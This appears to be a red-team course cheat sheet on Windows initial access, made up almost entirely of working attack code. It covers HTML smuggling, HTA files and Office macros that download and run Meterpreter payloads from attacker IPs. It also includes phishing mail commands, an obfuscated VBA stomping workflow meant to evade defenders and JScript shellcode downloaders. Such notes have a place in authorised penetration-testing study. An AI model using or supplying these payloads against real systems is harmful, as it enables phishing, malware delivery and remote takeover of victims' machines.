### HTML Smuggling & HTA Execution
- Auto-downloads when link is visited

        //EmbedInHTML.py:
            //auto-downloads file, and decrypts on the fly
            python2 embedInHTML.py -k mykey -f /home/kali/data/runner.doc -o foo.html && sudo cp output/foo.html /var/www/html/

        //.HTA Payloads:
            //auto-execute, running system commands when visited/viewed in browser
            #####Basic HTA File:#####
            <html>
            <head>
            <script language="VBScript"> 
                Sub RunProgram
                    Set objShell = CreateObject("Wscript.Shell")
                            ' Choose command to run at objShell.Run
                    objShell.Run "cmd.exe /c ping -n 2 192.168.49.121"
                End Sub
            RunProgram()
            </script>
            </head> 
            <body>
                "HELLO WORLD"
            </body>
            </html>
            ##################
            //Another HTA payload - shell via Hollow (w/ status updates via http):
                //local prep:
                    //update shellcode in Hollow.csproj...
                    del \\192.168.49.121\visualstudio\file4.txt && certutil -encode \\192.168.49.121\visualstudio\Hollow\Hollow.csproj \\192.168.49.121\visualstudio\file4.txt
                    sudo cp /home/kali/data/file4.txt /var/www/html/ 

                objShell.Run "cmd.exe /c del c:\windows\tasks\Hollow.csproj & bitsadmin /Transfer myJob http://192.168.49.121/file4.txt c:\windows\tasks\enc2.txt && certutil -decode c:\windows\tasks\enc2.txt c:\windows\tasks\Hollow.csproj && del c:\windows\tasks\enc2.txt & FOR /F ""tokens=* USEBACKQ"" %F IN (`whoami`) DO ( bitsadmin /Transfer myJob http://192.168.49.121/%F c:\windows\tasks\enc3.txt ) & FOR /F ""tokens=* USEBACKQ"" %F IN (`dir /B c:\windows\tasks\Hollow*`) DO ( bitsadmin /Transfer myJob http://192.168.49.121/%F c:\windows\tasks\enc3.txt ) & FOR /F ""tokens=* USEBACKQ"" %F IN (`dir /B C:\Windows\Microsoft.NET\Framework64\v4.0.30319\msbuild.exe`) DO ( bitsadmin /Transfer myJob http://192.168.49.121/%F c:\windows\tasks\enc3.txt ) & C:\Windows\Microsoft.NET\Framework64\v4.0.30319\msbuild.exe c:\Windows\Tasks\Hollow.csproj && bitsadmin /Transfer myJob http://192.168.49.121/COMPLETE c:\windows\tasks\enc3.txt"

            ##################
            //Another HTA example:
            <html>
            <head>
            <script language="JScript">
            var shell = new ActiveXObject("WScript.Shell");
            var res = shell.Run("powershell iwr -uri 'http://10.10.10.10/HOLLOW.exe' -Outfile C:\\Windows\\Tasks\\HOLLOW.exe;C:\\Windows\\Tasks\\HOLLOW.exe");
            </script>
            </head>
            <body>
            <script language="JScript">
            self.close();
            </script>
            </body>
            </html>

        //Basic HTML Smuggler:
            <html>
                <body>
                    <script>
                        function base64ToArrayBuffer(base64) {
                        var binary_string = window.atob(base64);
                        var len = binary_string.length;
                        
                        var bytes = new Uint8Array( len );
                            for (var i = 0; i < len; i++) { bytes[i] = binary_string.charCodeAt(i); }
                            return bytes.buffer;
                        }

                        // get compiled Hollow.js or Hollow.exe
                        // base64 -w0 Hollow.abc | xclip -i -sel clipboard
                        var file ='<METERPRETER_BASE64_CONTENTS>'
                        var data = base64ToArrayBuffer(file);
                        var blob = new Blob([data], {type: 'octet/stream'});
                        var fileName = 'evil.exe';

                        if (window.navigator.msSaveOrOpenBlob) {
                            window.navigator.msSaveOrOpenBlob(blob,fileName);
                        } else {
                            var a = document.createElement('a');
                            console.log(a);
                            document.body.appendChild(a);
                            a.style = 'display: none';
                            var url = window.URL.createObjectURL(blob);
                            a.href = url;
                            a.download = fileName;
                            a.click();
                            window.URL.revokeObjectURL(url);
                        }
                    </script>
                </body>
            </html>

        //Basic HTA Downloaders:
            <html>
            <head>
            <script language="VBScript"> 
                Sub RunProgram
                    Set objShell = CreateObject("Wscript.Shell")
                            ' Choose command to run at objShell.Run
                    objShell.Run "cmd.exe /c bitsadmin /Transfer myJob http://192.168.49.121/H.txt %USERPROFILE%\Desktop\H.txt && certutil -decode %USERPROFILE%\Desktop\H.txt C:\windows\tasks\H.exe && del %USERPROFILE%\Desktop\H.txt && C:\windows\tasks\H.exe"
                End Sub
            RunProgram()
            </script>
            </head> 
            <body>
                "HELLO WORLD"
            </body>
            </html>
        #################
        //Another One:
            <html>
            <head>
            <script language="VBScript"> 
                Sub RunProgram
                    Set objShell = CreateObject("Wscript.Shell")
                            ' Choose command to run at objShell.Run
                    objShell.Run "certutil.exe -urlcache -f http://127.0.0.1/mtr_rs_tcp_80.exe C:\windows\temp\svchost.exe"
                    
                    Dim dtmStartTime    
                    dtmStartTime = Now 
                    idTimer = window.setTimeout("PausedSection", 5000, "VBScript")
                End Sub
                
                Sub PausedSection
                    Msgbox dtmStartTime & vbCrLf & Now
                    Set objShell = CreateObject("Wscript.Shell")
                    objShell.Run "cmd.exe /c C:\windows\temp\svchost.exe"
                End Sub
                
            RunProgram()
            </script>
            </head> 
            <body>
                "Im definitly not suspicious"
            </body>
            </html>
        ######################
        //Demiguise HTA Smuggler:
            sudo python2 demiguise.py -k myKey -c "cmd.exe /c ..." -p Outlook.Application -o /var/www/html/run.hta
        ######################
        //SharpShooter Payload Generator:
            //automated method for generating executable payloads:
            //here, stageless means in-memory execution - it doesn't request the shellcode separately
            //Shellcode:
                sudo msfvenom -p windows/x64/meterpreter/reverse_https LHOST=tun0 LPORT=443 -f raw -o /var/www/html/shell.txt
            //Payloads:
                sudo python2 SharpShooter.py --payload js --dotnetver 4 --stageless --rawscfile /var/www/html/shell.txt --output test
                    //needs python2 - https://raw.githubusercontent.com/pizza-power/python2-sharpshooter/main/install.sh
                //Staged (via HTML smuggling) - not working:
                    msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.45.224 LPORT=443 -f csharp -o /tmp/cshcode
                    sudo python2 SharpShooter.py --payload js --delivery web --output foo --web http://192.168.45.224/foo.payload --shellcode --scfile /tmp/cshcode --smuggle --template mcafee --dotnetver 4
                    cp output/foo* /var/www/html/
                //Stageless (via HTML smuggling):
                    msfvenom -p windows/x64/meterpreter/reverse_https LHOST=tun0 LPORT=443 -f raw -o /tmp/cshcode
                    sudo python2 SharpShooter.py --payload js --output foo --stageless --rawscfile /tmp/cshcode --smuggle --template mcafee --dotnetver 4
                    sudo cp output/foo.html /var/www/html/
                    sudo python2 SharpShooter.py --payload hta --output foo --stageless --rawscfile /tmp/cshcode --smuggle --template mcafee --dotnetver 4


### Email Delivery

    //using attachments, or malicious HTA links
    //sends to a specified SMTP server

    //Attachment:
    mail --subject "My Issue" --exec "set sendmail=smtp://192.168.167.159:25;notls" --exec 'set verbose' -A /home/kali/Hollow.exe $to <<<"Hello, I have an issue: http://192.168.49.121/foo.html" Bob@abc.com

    //No Attachment:
    mail --subject "My Issue" --exec "set sendmail=smtp://192.168.167.159:25;notls" --exec 'set verbose' $to <<<"Hello, I have an issue: http://192.168.49.121/Run.hta" Bob@abc.com

    **Use manual payloads
    //msf method (needs pwsh; could be blocked) - sudo msfvenom -p windows/shell_reverse_tcp LHOST=tun0 LPORT=443 -f hta-psh -o /var/www/html/msfv.hta

### Office Macros & Runners

    //Basic VBA Macro:
        Sub Document_Open()
        MyMacro
        End Sub
        Sub AutoOpen()
        MyMacro
        End Sub
        Sub MyMacro()
        Dim str As String
        Dim shellName As String
        shellName = "msfstaged.exe"
        str = "cmd.exe /c del /F " + ActiveDocument.Path + "\" + shellName + " & powershell iwr -uri http://192.168.45.208/" + shellName + " -o " + ActiveDocument.Path + "\" + shellName
        Shell str, vbHide
        Dim exePath As String
        exePath = ActiveDocument.Path + "\" + shellName
        Wait (2)
        Shell exePath, vbHide
        End Sub
        Sub Wait(n As Long)
        Dim t As Date
        t = Now
        Do
        DoEvents
        Loop Until Now >= DateAdd("s", n, t)
        End Sub

    //Excel:
        use Workbook_Open() instead of AutoOpen/Document_Open

    //Basic Macro for Injectors, etc:
        Sub MyMacro()
        Dim str As String
        str = "powershell [System.Reflection.Assembly]::Load((New-Object System.Net.WebClient).DownloadData('http://192.168.45.224/ClassicProcessInjectorDLL.dll')).GetType('ClassicProcessInjectorDLL.MyClass').GetMethod('injector').Invoke(0, $null);if (! $?) {$wc2 = new-object system.net.WebClient;$wc2.proxy = $null;[System.Reflection.Assembly]::Load($wc2.DownloadData('http://192.168.45.224/ClassicProcessInjectorDLL.dll')).GetType('ClassicProcessInjectorDLL.MyClass').GetMethod('injector').Invoke(0, $null)}"
        Shell str, vbHide
        End Sub
        Sub Document_Open()
        MyMacro
        End Sub
        Sub AutoOpen()
        MyMacro
        End Sub

    //Content Substitution Macro (Phishing):
        Sub Document_Open()
        SubstitutePage
        End Sub
        Sub AutoOpen()
        SubstitutePage
        End Sub
        Sub SubstitutePage()
        ActiveDocument.Content.Select
        Selection.Delete
        ActiveDocument.AttachedTemplate.AutoTextEntries("TheDoc").Insert 
        Where:=Selection.Range, RichText:=True
        End Sub

    //Macro Generator (MSBuild) - x86:
        //Shellcode Method (x86):
            msfvenom -p windows/meterpreter/reverse_https LHOST=tun0 LPORT=443 EXITFUNC=thread -f raw -o sc.bin
            python2 m3-gen.py -p shellcode -i sc.bin -o out.vba
        //PowerShell Method (x86):
            python2 m3-gen.py -p powershell -i revVBA.ps1 -o out.vba
            //revVBA.ps1:
                (new-object system.net.webclient).downloadstring('http://192.168.49.121/amsi.txt') | IEX
                $data = (New-Object System.Net.WebClient).DownloadData('http://192.168.49.121/HollowDLL.dll')
                $assem = [System.Reflection.Assembly]::Load($data)
                $class = $assem.GetType("HollowDLL.Program")
                $method = $class.GetMethod("Hollow")
                $method.Invoke(0, $null)
        //Custom .csproj (x86?):
            python2 m3-gen.py -p custom -i HollowUAC.csproj -o out.vba

    //BadAssMacros Generator - x86:
        //Method 1 (x86 SC w/ Indirect Injection):
                msfvenom -p windows/meterpreter/reverse_https LHOST=tun0 LPORT=443 EXITFUNC=thread -f raw -o sc.bin
                .\BadAssMacrosx86.exe -i sc.bin -w doc -p no -s indirect -c 4 -o Code.vba
                //insert into Doc1.doc...
                .\BadAssMacrosx86.exe -i .\Doc1.doc -w doc -p yes -l
                .\BadAssMacrosx86.exe -i .\Doc1.doc -w doc -p yes -o Doc2.doc -m ThisDocument
            //Migrate Architecture:
                use post/windows/manage/archmigrate; set SESSION 1; set IGNORE_SYSTEM=true

    //PowerShell WMI Dechaining Macro (x64 process):
        //Powershell launches as a child of WmiPrvSE.exe, which is a child of svchost.exe - not Word
        Sub MyMacro
        strArg = "powershell -exec bypass -nop -c iex((new-object system.net.webclient).downloadstring('http://192.168.119.120/run.txt'))"
        GetObject("winmgmts:").Get("Win32_Process").Create strArg, Null, Null, pid
        End Sub
        Sub AutoOpen()
        Mymacro
        End Sub

    //Proxy-Aware PowerShell Download Cradle & Macro:
        //Defaults back to no proxy if the proxy doesn't work
        **Start 2 handlers w/ msf:  use multi/handler; set payload windows/meterpreter/reverse_https; set lhost tun0; set lport 443; run -j; set payload windows/meterpreter/reverse_https; set lhost tun0; set lport 8080; run -j
        ###########Cradle:#############
        New-PSDrive -Name HKU -PSProvider Registry -Root HKEY_USERS | Out-Null
        $keys = Get-ChildItem 'HKU:\'
        ForEach ($key in $keys) {if ($key.Name -like "*S-1-5-21-*") {$start = $key.Name.substring(10);break}}
        $proxyAddr=(Get-ItemProperty -Path "HKU:$start\Software\Microsoft\Windows\CurrentVersion\Internet Settings\").ProxyServer
        [system.net.webrequest]::DefaultWebProxy = new-object System.Net.WebProxy("http://$proxyAddr")
        $wc = new-object system.net.WebClient
        $wc.DownloadString("http://192.168.45.208/runner.txt")
        if (! $?) {$wc2 = new-object system.net.WebClient;$wc2.proxy = $null;$wc2.DownloadString('http://192.168.45.208/runnerNoProxy.txt'}
        ///OR:
        $browser = New-Object System.Net.WebClient
        $browser.Proxy.Credentials =[System.Net.CredentialCache]::DefaultNetworkCredentials
        ///OR:
        [System.Net.WebRequest]::DefaultWebProxy = [System.Net.WebRequest]::GetSystemWebProxy()
        [System.Net.WebRequest]::DefaultWebProxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials
        ###########Macro:#############
        Sub MyMacro()
        Dim str As String
        str = "powershell New-PSDrive -Name HKU -PSProvider Registry -Root HKEY_USERS | Out-Null;$sid='*S-1-5-21-*';ForEach ($key in $(Get-ChildItem 'HKU:\')) {if ($key.Name -like $sid) {$start = $key.Name.substring(10);break}};$proxyAddr=(Get-ItemProperty -Path 'HKU:$start\Software\Microsoft\Windows\CurrentVersion\Internet Settings\').ProxyServer;[system.net.webrequest]::DefaultWebProxy = new-object System.Net.WebProxy('http://$proxyAddr');(new-object system.net.WebClient).DownloadString('http://192.168.45.208/runner.txt') | IEX;if (! $?) {$wc2 = new-object system.net.WebClient;$wc2.proxy = $null;$wc2.DownloadString('http://192.168.45.208/runnerNoProxy.txt')|IEX}"
        Shell str, vbHide
        End Sub
        Sub Document_Open()
        MyMacro
        End Sub
        Sub AutoOpen()
        MyMacro
        End Sub
        //quote within quotes troubleshooting for VBA:
            works:  str = "powershell (New-Object System.Net.WebClient).DownloadString(" & Chr(39) & "http://192.168.45.208/runner.txt" & Chr(39) & ") | IEX"
        //worked from cmd:
            powershell "New-PSDrive -Name HKU -PSProvider Registry -Root HKEY_USERS | Out-Null;ForEach ($key in $(Get-ChildItem 'HKU:\')) {if ($key.Name -like \"*S-1-5-21-*\") {$start = $key.Name.substring(10);break}};$proxyAddr=(Get-ItemProperty -Path \"HKU:$start\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\\").ProxyServer;[system.net.webrequest]::DefaultWebProxy = new-object System.Net.WebProxy(\"http://$proxyAddr\");(new-object system.net.WebClient).DownloadString('http://192.168.45.208/runner64.txt') | IEX"
        ###########Proxy Troubleshooting:#############
        Proxy Checking/Bypass:
            Net.WebClient is proxy aware (for now at least); Meterpreter is also proxy aware
                Meterpreter is fully proxy aware - both system settings/registry and netsh winhttp proxy
            Check if proxy will be used for a request (host/port):  [System.Net.WebRequest]::DefaultWebProxy.GetProxy("http://192.168.45.208/runner.ps1")
            Bypass:
                $wc = new-object system.net.WebClient
                $wc.proxy = $null
                $wc.DownloadString("http://192.168.45.208/runner.ps1")
        Setting User-Agent:
            $wc = new-object system.net.WebClient
            $wc.Headers.Add('User-Agent', "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36")
            $wc.DownloadString("http://192.168.45.208/runner.ps1")
        Using User's Proxy in SYSTEM Session:
            //Test:  PsExec.exe -s -i C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell_ise.exe; do the request and check access log
            Stored at:  HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\InternetSettings - ProxyEnable; ProxyServer
            Map it as System:  New-PSDrive -Name HKU -PSProvider Registry -Root HKEY_USERS | Out-Null
            ...
            //see proxy-aware PowerShell download cradle that works while SYSTEM - and can fallback to no proxy

    //CaesarEncoder.ps1 Helper Script:
        $payload = "powershell -exec bypass -nop -w hidden -c iex((new-object system.net.webclient).downloadstring('http://192.168.45.223/run.txt'))"
        [string]$output = ""
        $payload.ToCharArray() | %{
        [string]$thischar = [byte][char]$_ + 17
        if($thischar.Length -eq 1)
        {
        $thischar = [string]"00" + $thischar
        $output += $thischar
        }
        elseif($thischar.Length -eq 2)
        {
        $thischar = [string]"0" + $thischar
        $output += $thischar
        }
        elseif($thischar.Length -eq 3)
        {
        $output += $thischar
        }
        }
        $output | clip

    //EvilClippy.exe Document Obfuscation:
        //VBA Stomping - removing macro and putting code into the P-cache to be executed automatically
        Hide Macros from GUI: -g ; undo: -gg
        Stomp VBA (include fake code):  -s fakecode.vba
        Random module names:  -r ; undo: -rr
        Set target Office version (only affects that version):  -t 2016x86
        ex. EvilClippy.exe [-s fake.vbs] [-t 2016x86] -g -r runner.doc

    //**Fully Obfuscated Example with MSBuild Execution Bypass:
        //1. Prep:
            msfvenom -p windows/x64/meterpreter/reverse_https LHOST=tun0 LPORT=443 -f csharp --encrypt xor --encrypt-key a
            del \\192.168.49.121\visualstudio\file4.txt && certutil -encode \\192.168.49.121\visualstudio\Hollow\Hollow.csproj \\192.168.49.121\visualstudio\file4.txt
            sudo cp /home/kali/data/file4.txt /var/www/html/
            //create encoded payload (below) and copy macro into new Word doc - save as 97-03 or Macro enabled format
        //2. Obfuscate doc with EvilClippy:
            ** \\192.168.49.121\visualstudio\EvilClippy.exe -s \\192.168.49.121\visualstudio\fake.vbs -g -r runner.doc
            //##Serve doc via http:
                python2 embedInHTML.py -k mykey -f /home/kali/data/runner.doc -o foo.html && sudo cp output/foo.html /var/www/html/
                http://192.168.49.121/foo.html
        //3. Monitor: tail -f /var/log/apache2/access.log
        //Payload for CaesarEncoder.ps1:
            $payload = 'cmd.exe /c del c:\windows\tasks\Hollow.csproj & bitsadmin /Transfer myJob http://192.168.49.121/file4.txt c:\windows\tasks\enc2.txt && certutil -decode c:\windows\tasks\enc2.txt c:\windows\tasks\Hollow.csproj && del c:\windows\tasks\enc2.txt && FOR /F "tokens=* USEBACKQ" %F IN (`whoami`) DO ( bitsadmin /Transfer myJob http://192.168.49.121/%F c:\windows\tasks\enc3.txt ) & FOR /F "tokens=* USEBACKQ" %F IN (`dir /B c:\windows\tasks\Hollow*`) DO ( bitsadmin /Transfer myJob http://192.168.49.121/%F c:\windows\tasks\enc3.txt ) & FOR /F "tokens=* USEBACKQ" %F IN (`dir /B C:\Windows\Microsoft.NET\Framework64\v4.0.30319\msbuild.exe`) DO ( bitsadmin /Transfer myJob http://192.168.49.121/%F c:\windows\tasks\enc3.txt ) & C:\Windows\Microsoft.NET\Framework64\v4.0.30319\msbuild.exe c:\Windows\Tasks\Hollow.csproj && bitsadmin /Transfer myJob http://192.168.49.121/COMPLETE c:\windows\tasks\enc3.txt'
        //The Final Macro (prior to EvilClippy obfuscation):
            Function Pears(Beets)
            Pears = Chr(Beets - 17)
            End Function
            Function Strawberries(Grapes)
            Strawberries = Left(Grapes, 3)
            End Function
            Function Almonds(Jelly)
            Almonds = Right(Jelly, Len(Jelly) - 3)
            End Function
            Function Nuts(Milk)
            Do
            Oatmilk = Oatmilk + Pears(Strawberries(Milk))
            Milk = Almonds(Milk)
            Loop While Len(Milk) > 0
            Nuts = Oatmilk
            End Function
            Function MyMacro()
            Dim Apples1 As String
            Dim Apples2 As String
            Dim Apples3 As String
            Dim Apples4 As String
            Dim Apples As String
            Dim Water As String
            'Checking if doc name is runner.doc:
            If ActiveDocument.Name <> Nuts("131134127127118131063117128116") Then
            Exit Function
            End If
            'PS payload From CaesarEncoder.ps1:
            Apples1 = "116126117063118137118049064116049117118125049116075109136122127117128136132109133114132124132109089128125125128136063116132129131128123049055049115122133132114117126122127049064101131114127132119118131049126138091128115049121133133129075064064066074067063066071073063069070063067068065064119122125118069063133137133049116075109136122127117128136132109133114132124132109118127116067063133137133049055055049116118131133134133122125049062117118116128117118049116075109136122127117128136132109133114132124132109118127116067063133137133049116075109136122127117128136132109133114132124132109089128125125128136063116132"
            Apples2 = "129131128123049055055049117118125049116075109136122127117128136132109133114132124132109118127116067063133137133049055055049087096099049064087049051133128124118127132078059049102100086083082084092098051049054087049090095049057113136121128114126122113058049085096049057049115122133132114117126122127049064101131114127132119118131049126138091128115049121133133129075064064066074067063066071073063069070063067068065064054087049116075109136122127117128136132109133114132124132109118127116068063133137133049058049055049087096099049064087049051133128124118127132078059049102100086083082084092098051049054087049090095049"
            Apples3 = "057113117122131049064083049116075109136122127117128136132109133114132124132109089128125125128136059113058049085096049057049115122133132114117126122127049064101131114127132119118131049126138091128115049121133133129075064064066074067063066071073063069070063067068065064054087049116075109136122127117128136132109133114132124132109118127116068063133137133049058049055049087096099049064087049051133128124118127132078059049102100086083082084092098051049054087049090095049057113117122131049064083049084075109104122127117128136132109094122116131128132128119133063095086101109087131114126118136128131124071069109135069063065063068065068066074109126132115134122125117063118137118113058049085096049057049115122133132114117126122127049064101131114127132119118131049126138091128"
            Apples4 = "115049121133133129075064064066074067063066071073063069070063067068065064054087049116075109136122127117128136132109133114132124132109118127116068063133137133049058049055049084075109104122127117128136132109094122116131128132128119133063095086101109087131114126118136128131124071069109135069063065063068065068066074109126132115134122125117063118137118049116075109104122127117128136132109101114132124132109089128125125128136063116132129131128123049055055049115122133132114117126122127049064101131114127132119118131049126138091128115049121133133129075064064066074067063066071073063069070063067068065064084096094097093086101086049116075109136122127117128136132109133114132124132109118127116068063133137133"
            Apples = Apples1 & Apples2 & Apples3 & Apples4
            Water = Nuts(Apples)
            GetObject(Nuts("136122127126120126133132075")).Get(Nuts("104122127068067112097131128116118132132")).Create Water, Tea, Coffee, Napkin
            End Function
            Sub AutoOpen()
            MyMacro
            End Sub


### Windows Script Host (JScript)

    //Jscript is Javascript that can be executed outside the browser by the Windows Script Host
        //Another option is VBScript
        //Run with wscript.exe or cscript.exe

    //Tips:
        //for debugging, launch window as visible, not hidden - sh.Run... "+WScript.ScriptFullName,1,1);
        **Prepend AMSI bypass to output file
        //for AppLocker bypass, try writing to ADS
        //on a 64-bit Windows, Jscript will execute in a 64-bit context by default

    ##Basic Jscript File (test.js):
    var shell = new ActiveXObject("WScript.Shell")
    var res = shell.Run("cmd.exe");

    ##Basic VBScript File (test.vbs):
    Set oShell = WScript.CreateObject("WScript.Shell")
    oShell.run "cmd.exe"


    ################Basic Jscript Shellcode Runner:################
    //sudo msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.45.157 LPORT=443 -f exe -o /var/www/html/msfJscript.exe

    ###########V1:#############
    //proxy-aware by default (only when running as user)

    var url = "http://192.168.45.157/msfJscript.exe"
    var Object = WScript.CreateObject('MSXML2.XMLHTTP');
    Object.Open('GET', url, false);
    Object.Send();
    if (Object.Status == 200)
    {
    var Stream = WScript.CreateObject('ADODB.Stream');
    Stream.Open();
    Stream.Type = 1;
    Stream.Write(Object.ResponseBody);
    Stream.Position = 0;
    Stream.SaveToFile("met.exe", 2);
    Stream.Close();
    }
    var r = new ActiveXObject("WScript.Shell").Run("met.exe");

    ###########V2:#############
    //with added proxy awareness (even as System):

    var url = "http://192.168.45.157/msfJscript.exe"
    var Object = WScript.CreateObject('MSXML2.ServerXMLHTTP');
    Object.setProxy(0);	//use system proxy - ONLY READS FROM netsh winhttp show proxy (not system settings) - set w/ netsh winhttp set proxy <ip>:<port>
    //Manual Proxy: Object.setProxy(2, "192.168.189.12:3128");
    //No Proxy: Object.setProxy(1);
    Object.open('GET', url, false);
    Object.send();

    if (Object.status == 200)
    {
    var Stream = WScript.CreateObject('ADODB.Stream');
    Stream.Open();
    Stream.Type = 1;
    Stream.Write(Object.responseBody);
    Stream.Position = 0;
    Stream.SaveToFile("met.exe", 2);
    Stream.Close();
    }
    var r = new ActiveXObject("WScript.Shell").Run("met.exe");